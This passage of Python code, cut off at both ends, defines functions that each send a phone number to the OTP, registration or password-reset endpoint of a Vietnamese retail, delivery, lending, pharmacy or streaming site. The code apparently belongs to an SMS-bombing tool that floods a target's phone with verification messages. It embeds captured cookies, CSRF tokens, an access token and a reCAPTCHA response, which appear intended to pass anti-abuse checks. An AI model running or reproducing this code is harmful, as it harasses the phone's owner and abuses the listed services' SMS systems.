cebs=1; _ga_TZK5WPYMMS=GS1.2.1720103766.6.0.1720103766.60.0.0; _ga_TLRZMSX5ME=GS1.1.1720103764.33.1.1720103766.58.0.0; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJd3RMg_oH21tPCzsfyvP67TancQxqdKiTt3KvD0.1; _ce.clock_data=-186%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; cebsp_=1; _ce.s=v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1720103774343~vpv~24~lva~1720103765900~v11slnt~1712503853696~v11.cs~127806~v11.s~bfab1f60-3a12-11ef-9d92-dbe9f22de209~v11.sla~1720103774571~lcw~1720103774571",
    'Origin': 'https://www.thegioididong.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBMG5vy2Ok1mvC8SbvlKgWIOz2Y3oc5DTGZxHd9t5Hsux7Fa-HK_oS6VsTyiSM9I--XIfDq9NA1NYxg9q87YfcUjoav9khceFwpr0rM5aRgoR-ivz9IHBVr9ZIWxqNXtMWE',
}

    response = requests.post(
    'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
def bestinc(phone):
    headers = {
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://www.best-inc.vn',
    'Referer': 'https://www.best-inc.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'accept': 'application/json',
    'authorization': 'null',
    'content-type': 'application/json',
    'lang-type': 'vi-VN',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-auth-type': 'WEB',
    'x-lan': 'VI',
    'x-nat': 'vi-VN',
    'x-timezone-offset': '7',
}

    json_data = {
    'phoneNumber': phone,
    'verificationCodeType': 1,
}

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)

def money(phone):
    cookies = {
    'CaptchaCookieKey': '0',
    'language': 'vi',
    'UserTypeMarketing': 'L0',
    '__sbref': 'aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux',
    'ASP.NET_SessionId': 'k1lr5wm2mja2oyaf1zkcrdtu',
    'RequestData': '85580b70-8a3a-4ebc-9746-1009df921f42',
    '_gid': 'GA1.2.2031038846.1691083804',
    'UserMachineId_png': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId_etag': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId_cache': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    '__RequestVerificationToken': 'G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41',
    '_ga_LCPCW0ZYR8': 'GS1.1.1691083803.8.1.1691084292.44.0.0',
    '_ga': 'GA1.2.149632214.1689613025',
    'Marker': 'MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=',
}

    headers = {
    'authority': 'moneyveo.vn',
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'CaptchaCookieKey=0; language=vi; UserTypeMarketing=L0; __sbref=aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux; ASP.NET_SessionId=k1lr5wm2mja2oyaf1zkcrdtu; RequestData=85580b70-8a3a-4ebc-9746-1009df921f42; _gid=GA1.2.2031038846.1691083804; UserMachineId_png=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_etag=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_cache=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId=fd5259b0-62a7-41c7-b5c5-e4ff646af322; __RequestVerificationToken=G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41; _ga_LCPCW0ZYR8=GS1.1.1691083803.8.1.1691084292.44.0.0; _ga=GA1.2.149632214.1689613025; Marker=MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=',
    'origin': 'https://moneyveo.vn',
    'referer': 'https://moneyveo.vn/vi/registernew/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-d26637ca1a2ab6f01520174ccd97bf37-9060d6bf9370d383-00',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phoneNumber': phone,
}

    response = requests.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', cookies=cookies, headers=headers, data=data)

def winmart(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer undefined',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://winmart.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://winmart.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-api-merchant': 'WCM',
}

    json_data = {
    'firstName': 'Taylor Jasmine',
    'phoneNumber': phone,
    'masanReferralCode': '',
    'dobDate': '2005-08-05',
    'gender': 'Male',
}

    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
def alf(phone):
   headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN',
    'BrandCode': 'ALFRESCOS',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'DeviceCode': 'web',
    'Origin': 'https://alfrescos.com.vn',
    'Referer': 'https://alfrescos.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

   params = {
    'culture': 'vi-VN',
}

   json_data = {
    'phoneNumber': phone,
    'secureHash': 'c4c8f1e0d64fb17c352e0456311df372',
    'deviceId': '',
}

   response = requests.post(
    'https://api.alfrescos.com.vn/api/v1/User/CheckPhoneNumberExits',
    params=params,
    headers=headers,
    json=json_data,
)
def phuc(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer undefined',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://order.phuclong.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://order.phuclong.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'userName': phone,
}

    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd', headers=headers, json=json_data) 

def emart(phone):
    cookies = {
    'emartsess': 'gmdbftq46lqooc1s5iv9l7nsn0',
    'default': 'e6ec14ce933f55f7f1a9bb7355',
    'language': 'vietn',
    'currency': 'VND',
    '_fbp': 'fb.2.1691143292627.1008340188',
    '_gid': 'GA1.3.332853186.1691143293',
    '_gat_gtag_UA_117859050_1': '1',
    '_ga_ZTB26JV4YJ': 'GS1.1.1691143293.1.1.1691143433.0.0.0',
    '_ga': 'GA1.1.736434119.1691143293',
}

    headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'emartsess=gmdbftq46lqooc1s5iv9l7nsn0; default=e6ec14ce933f55f7f1a9bb7355; language=vietn; currency=VND; _fbp=fb.2.1691143292627.1008340188; _gid=GA1.3.332853186.1691143293; _gat_gtag_UA_117859050_1=1; _ga_ZTB26JV4YJ=GS1.1.1691143293.1.1.1691143433.0.0.0; _ga=GA1.1.736434119.1691143293',
    'Origin': 'https://emartmall.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'X-Requested-With': 'XMLHttpRequest',
}

    data = {
    'mobile': phone,
}

    response = requests.post(
    'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
    cookies=cookies,
    headers=headers,
    data=data,
)

def hana(phone):
   cookies = {
    '_gcl_au': '1.1.487662989.1723207344',
    '_gid': 'GA1.2.1011519595.1723207344',
    '_tt_enable_cookie': '1',
    '_ttp': 'tjNa--9H4QzK-hD9vR5pwlcBjuy',
    '_ym_uid': '1723207346172647753',
    '_ym_d': '1723207346',
    '_ym_isad': '1',
    '_gcl_aw': 'GCL.1723269932.CjwKCAjw_Na1BhAlEiwAM-dm7LrKXqRiAUTq4nnFeOHoz4JDpUYWH9LmuruiIdMbKsSNV8yJz8HFfxoChogQAvD_BwE',
    '_fbp': 'fb.1.1723269932317.251662867841419932',
    '_ga': 'GA1.2.1243190707.1723207344',
    '_gac_UA-151110385-1': '1.1723269932.CjwKCAjw_Na1BhAlEiwAM-dm7LrKXqRiAUTq4nnFeOHoz4JDpUYWH9LmuruiIdMbKsSNV8yJz8HFfxoChogQAvD_BwE',
    '_ym_visorc': 'w',
    '_ga_P2783EHVX2': 'GS1.1.1723269932.2.1.1723270058.60.0.0',
}

   headers = {
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'content-type': 'application/json; charset=utf-8',
    # 'cookie': '_gcl_au=1.1.487662989.1723207344; _gid=GA1.2.1011519595.1723207344; _tt_enable_cookie=1; _ttp=tjNa--9H4QzK-hD9vR5pwlcBjuy; _ym_uid=1723207346172647753; _ym_d=1723207346; _ym_isad=1; _gcl_aw=GCL.1723269932.CjwKCAjw_Na1BhAlEiwAM-dm7LrKXqRiAUTq4nnFeOHoz4JDpUYWH9LmuruiIdMbKsSNV8yJz8HFfxoChogQAvD_BwE; _fbp=fb.1.1723269932317.251662867841419932; _ga=GA1.2.1243190707.1723207344; _gac_UA-151110385-1=1.1723269932.CjwKCAjw_Na1BhAlEiwAM-dm7LrKXqRiAUTq4nnFeOHoz4JDpUYWH9LmuruiIdMbKsSNV8yJz8HFfxoChogQAvD_BwE; _ym_visorc=w; _ga_P2783EHVX2=GS1.1.1723269932.2.1.1723270058.60.0.0',
    'origin': 'https://vayvnd.vn',
    'priority': 'u=1, i',
    'referer': 'https://vayvnd.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'site-id': '3',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'login': phone,
    'trackingId': '9fNiOwzJvRuqkOH2BqnIxbQdMjAf6bzeEE2tnw8zMc0Slb6tc3rSWZkf8av6yvtK',
    'antispamCheckData': {
        'hostname': 'vayvnd.vn',
        'recaptchaResponse': '03AFcWeA70TMZnOmc5P7mdDGc5hjFSjvcoMvdMa1zwhX8shP7LpErTEiOrFaUFPFPE1EIrJ81dNGOdIpUJuDmImzC5Z2nS5gG7uztywbERyRr_GFYxy5fkyhlAuhLivAU-79T9EIGpDjk7L8lV_zSU-OdMxpOTIMN5F7uPhQY5ir54Ojfcf_LcXNDAApG__hIUvT7NF7i7TqSyyi1AULft7wDRa4SvWKM2kq3ZCm_P654oL1zJf_UvLQKatKVOYxBPebSrtGx9Xv_7QiuK3lGyBVJfiqo-9fvLd_hgCOtps8hMbQV3Vz6UPuwqTaZfAQgyw9ACJaJKHSo_iA48xp3SdJk6sBmnRLW5LS0XhxhDdOUWma-xafXFWqNI_y0DK05JJBRRujjoXus79l_yJ7deaA-r1pFvlVW_J6IwHsz7jxAP4ty3NkOVTdAi_THdxFsjfy3fNGYO-cW6GjV02yu9F0jcraw0pt5uGghyDcGhbYl2S48HCYir18qJFefW4tZ9DqiZ1XJ_sb34aQsr0jfUJG8wbZMrkPU4mdT8nDlMkpUqp4bp3ELYUxiwlEVGwqfeeHkX-aSU_th2PVCACDcxxpfVUZLPRi1aXuEfhnOF_CyMYQ0sLURvJO7uTDjz6lK1IFqoj5WLdNb5Ob_P-itcvYLOC42rc41D0naxjkiZRy0k1Wnrqi0m2ihsF_nmGlFWSuNGn0yFgfl6gTTnDJ7vpCCkRlKqKXQEflk1_LBz9J3i9k_PzDlp5c1GJwPHKgAqbi6rl11MtsjY_iJ2SNmxsyv-DCBVMRlMPw1lP87k-fnZQa_5pVDeKnZedSMdh1B5zMayLiIxHKKJ0bHRE-c1Vk4fYrIWKGikKqFfushaa9LCkE_FteLTAKAo5KPWc2eSEy7V4EP3CPBGPx6lkyBaWxEbqlyPmrcl1eSoom9l9sF66K5LOEcMm2RWM3NxXWe6MAOEufch_RjJAek7dqhPXiy2tN1e5mYqvDBpEzaBppbzWeDY13-oWpjTZAR8iDr0Sr3nrk6ygwFWVHsJ-9mW0PI8fCpbWxXJ49sQ_oODhbayALbjL9VaShtu5efpF3jkAMjQSw1z5wC8Poqq8ci5iRcQSvd6jLLqJ04ymW6nmYFgaHXftiernl-O3jJwYBLP2Is6ZrS8Ee-RThVWtpPWO3y10JeuasK2d5CQAWak3YRbuMIxtuK2CE9Ypaj-TgJPNhAG5uIJRMWwVJ3m17fUKEWEOdI7-0vFL1wyliQHgAVA6ISsW4hFxf0CtMvj20ekClRqweN545YOuNKc5TMjKaSRJGBn4maMg8Nbltv9U7YDfjghJywW69w6EkH8yqtsoY1gQW24z10kFsJWXgKJWdyW3HeGFPzDBKBBP93wG6pn0ghEmgFNW98Yt8mUMlyh0VtK7R0nTT46J1Tl10TvCqmLHueGgMvqxZBnXG16j6K9bCZZioWGju_0q_rtbusqcc88hve2Hy9c1tLk8XL-LZ7lectnaBaE-xA4GhAif11aFCUULXPKBkn3uwsGamaunspzT-H4A7ciSU4jJlK-1el2U1SH9R2oQm1eUP0Eh_YlU9s9pN5Dv6xnnLYvdE2KnVhcwTvRGaegLhzSHAPvW-S4eppkSa4T-COVr113ZU3cGol-WFEmMz8SUksoc4Fyz5i2Z6LHiLCQFSo6ITbI2pYrLWc0WIMtxooQj_ysPznRJURQSul2osWDBD5ZLQINrVPifREwlNAbGiEgit_ve9CZaE-ktOGnazUGF8dCGfQWw1BeSd52Ltk5m-QAiAkGq4B8zpSJqC2cMiUEe4gS47FiMEjwyhVjoZKbRvfn0O-UEOKTM2ja7ZdtmGGvOrLmorIJqQBBaw6a5y8weNnPfSdDnaJGdKLTXyrQ0h44ofKmuEzMVITurc5HB4z6-uhkbivaODZYWiiyDTMlTg2pXW6Zq4IzShAQJbaAMgoiv_r8o7dJGNGE8IABGVYf2LRWypES1HYHXHfyHA3mIOKNmYAe0Q9biK-rgQusons39w51x6OZAMILhW3-zsmpIMfwhKSXLGMor-Gj5cFu4lLCVx42S0-VdMVdJdnHwFQrOUU7YBm-vVtkZq4kalV6EJAjUkSS7tX2ouPIRW7gtRao1EYt99n_jseLrj9-8WzwNgi1i9RajZLmytjrva8wXG3gzenMLnNAia6e',
    },
}

   response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
def kingz(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'domain': 'kingfoodmart',
    'origin': 'https://kingfoodmart.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://kingfoodmart.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'operationName': 'SendOTP',
    'variables': {
        'phone': phone,
    },
    'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
}

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
def med(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://id-v121.medpro.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://id-v121.medpro.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'appid': 'medpro',
    'cskhtoken': '',
    'locale': '',
    'momoid': '',
    'osid': '',
    'ostoken': '',
    'partnerid': 'medpro',
    'platform': 'pc',
}

    json_data = {
    'fullname': 'người dùng medpro',
    'deviceId': '401387b523eda9fc5998c36541400134',
    'phone': phone,
    'type': 'password',
}

    response = requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, json=json_data)
###
def ghn(phone):
    headers = {
    'authority': 'online-gateway.ghn.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://sso.ghn.vn',
    'pragma': 'no-cache',
    'referer': 'https://sso.ghn.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': phone,
    'type': 'register',
}

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
 ###
def shop(phone):
    cookies = {
    '_gcl_au': '1.1.1745429184.1691586808',
    '_fbp': 'fb.1.1691586808676.1451418847',
    '_ga': 'GA1.2.1936138960.1691586808',
    '_gid': 'GA1.2.1897491687.1691674994',
    '_gat_UA-78703708-2': '1',
    '_ga_P138SCK22P': 'GS1.1.1691674994.3.1.1691675011.43.0.0',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_gcl_au=1.1.1745429184.1691586808; _fbp=fb.1.1691586808676.1451418847; _ga=GA1.2.1936138960.1691586808; _gid=GA1.2.1897491687.1691674994; _gat_UA-78703708-2=1; _ga_P138SCK22P=GS1.1.1691674994.3.1.1691675011.43.0.0',
    'Origin': 'https://shopiness.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://shopiness.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'action': 'verify-registration-info',
    'phoneNumber': phone,
    'refCode': '',
}

    response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data)  
###
def gala(phone):
   headers = {
    'accept': '*/*',
    'accept-language': 'vi',
    'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0ZTc1NmU4My1kNDcxLTQxY2YtODE5Ny1mNWQ0N2I4YzAzNDAiLCJkaWQiOiJjMjAzNzY3YS03MzU4LTQ5MDYtYmIxMS00MjVkNWZmYjRmMDEiLCJpcCI6IjI3LjIuMTM2LjE5NCIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8cGN8d2luZG93c3wxMHxjaHJvbWUiLCJhcHBfdmVyc2lvbiI6IjIuMC4wIiwiaWF0IjoxNzIzMjY4Mzc4LCJleHAiOjE3Mzg4MjAzNzh9.BVIQWLVz7mxQK5cNgjnaut9D9UdOsAFzEBrnj-EAMWM',
    'origin': 'https://galaxyplay.vn',
    'priority': 'u=1, i',
    'referer': 'https://galaxyplay.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

   params = {
    'phone': phone,
}
   response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
def ahamove(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://app.ahamove.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://app.ahamove.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'mobile': phone,
    'name': 'khải',
    'email': 'khaisasdjksn@gmail.com',
    'country_code': 'VN',
    'firebase_sms_auth': 'true',
    'time': 1720101304,
    'checksum': 'Ux7gAkb+yFErrq5SsmdmJ8KE31qEen0zSglqznawm5X62j/7LCI+vpgPc7zLxxfpCVrrtQPzKCv5TP0U6pPPa1bjkQT4dF7ta4VDKHqb5fNAkyp9AUkDXexZ7XvsC8qgVWJKHFwj7X5sacNq/LG8yWTuaTP5z+5pLdgzRja8MSPsnX4Sbl2Alps+vm3bc6vZH67c2gA1ScxiZrXotAiwfRgiTH500HJGYz+4h7t6H6r4TXqHQyhPGcUEQUTuW1201w740aVOpx/VvcqBGjLaUWvI6GJJjHGVN1b+EcIc/JnDa068qudt+vfBxBGT6Jt/qcigwxUG9rf0DJvzkbqJfg==',
}

    response = requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data)
def lon(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'access-control-allow-origin': '*',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://nhathuoclongchau.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://nhathuoclongchau.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-channel': 'EStore',
}

    json_data = {
    'phoneNumber': phone,
    'otpType': 0,
    'fromSys': 'WEBKHLC',
}

    response = requests.post(
    'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
    headers=headers,
    json=json_data,
)
def medi(phone):
    cookies = {
    'SERVER': 'nginx3',
    '_gcl_au': '1.1.2035327165.1720297698',
    'XSRF-TOKEN': 'eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0%3D',
